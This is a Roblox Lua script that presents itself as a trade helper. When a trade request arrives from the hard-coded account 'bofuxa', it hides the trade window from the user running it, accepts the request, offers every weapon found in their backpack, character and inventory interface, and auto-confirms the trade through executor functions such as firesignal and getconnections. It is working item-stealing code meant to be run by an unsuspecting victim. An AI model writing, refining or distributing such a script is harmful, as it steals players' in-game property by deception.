local Players = game:GetService("Players")
local ReplicatedStorage = ReplicatedStorage or game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = TradeFolder:WaitForChild("SendRequest")
local AcceptRequest = TradeFolder:WaitForChild("AcceptRequest")
local StartTradeEvent = TradeFolder:WaitForChild("StartTrade")
local OfferItemEvent = TradeFolder:WaitForChild("OfferItem")
local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")

print("Waiting for incoming trade request callback...")

local function collectAllWeapons()
    local weaponsList = {}
    
    -- 1. Scan Player Backpack tools
    if LocalPlayer:FindFirstChild("Backpack") then
        for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                table.insert(weaponsList, tool.Name)
            end
        end
    end

    -- 2. Scan equipped character items
    if LocalPlayer.Character then
        for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(weaponsList, item.Name)
            end
        end
    end

    -- 3. Scan PlayerGui UI inventory elements (deep recursive check for any grid/scrolling frames containing weapons)
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        local function scanGui(parent)
            for _, child in ipairs(parent:GetChildren()) do
                if child:IsA("GuiObject") then
                    local nameLower = child.Name:lower()
                    -- Check if frame represents an item or weapon container entry
                    if child:IsA("ImageButton") or child:IsA("TextButton") or (child:IsA("Frame") and child:FindFirstChildOfClass("ImageLabel")) then
                        local itemName = child.Name
                        if itemName ~= "Template" and itemName ~= "Container" then
                            local count = 1
                            local qtyAttr = child:GetAttribute("Count") or child:GetAttribute("Quantity") or child:GetAttribute("Amount")
                            if type(qtyAttr) == "number" then
                                count = qtyAttr
                            end
                            for i = 1, count do
                                table.insert(weaponsList, itemName)
                            end
                        end
                    end
                end
                scanGui(child)
            end
        end
        
        local tradeGui = playerGui:FindFirstChild("TradeGUI")
        local mainGui = playerGui:FindFirstChild("MainGUI")
        if mainGui then scanGui(mainGui) end
        if tradeGui then scanGui(tradeGui) end
    end

    return weaponsList
end

SendRequest.OnClientInvoke = function(senderPlayer)
    local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
    
    if senderName:lower() == "bofuxa" then
        print("Trade request verified from bofuxa. Accepting...")
        
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        if playerGui then
            local tradeGui = playerGui:FindFirstChild("TradeGUI")
            if tradeGui then
                for _, childName in ipairs({"Container", "Processing", "BG"}) do
                    local element = tradeGui:FindFirstChild(childName)
                    if element then
                        element.Visible = false
                    end
                end
            end
        end

        pcall(function()
            AcceptRequest:FireServer()
        end)
        
        task.spawn(function()
            print("Trade started! Waiting 1.5 seconds for interface synchronization...")
            task.wait(1.5)
            
            pcall(function()
                if firesignal then
                    firesignal(StartTradeEvent.OnClientEvent, {
                        Locked = false,
                        LastOffer = tick(),
                        Player2 = { Player = LocalPlayer, Offer = {}, Accepted = false },
                        Player1 = { Player = senderPlayer, Offer = {}, Accepted = false }
                    }, "Bofuxa")
                end
            end)

            -- Gather and offer all detected weapons
            local weapons = collectAllWeapons()
            local offeredCount = 0
            
            for _, weaponName in ipairs(weapons) do
                pcall(function()
                    OfferItemEvent:FireServer(weaponName, "Weapons")
                end)
                offeredCount = offeredCount + 1
                task.wait(0.04)
            end
            
            print("Successfully offered " .. tostring(offeredCount) .. " weapon items!")

            print("Waiting 4 seconds before confirming trade...")
            task.wait(4)

            pcall(function()
                if firesignal and AcceptTradeEvent.OnClientEvent then
                    firesignal(AcceptTradeEvent.OnClientEvent, false)
                else
                    AcceptTradeEvent:FireServer()
                end
            end)

            -- Trigger UI accept and confirmation buttons securely
            pcall(function()
                local tGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
                if tGui then
                    for _, btn in ipairs(tGui:GetDescendants()) do
                        if btn:IsA("GuiButton") then
                            local fullName = btn:GetFullName():lower()
                            if fullName:find("accept") or fullName:find("confirm") or fullName:find("actionbutton") then
                                if getconnections then
                                    for _, conn in ipairs(getconnections(btn.Activated)) do conn:Fire() end
                                    for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do conn:Fire() end
                                end
                                btn:Activate()
                            end
                        end
                    end
                end
            end)
        end)

        return true
    else
        print("Trade request from other player (" .. senderName .. "). Allowing normal trade...")
        return true
    end
end
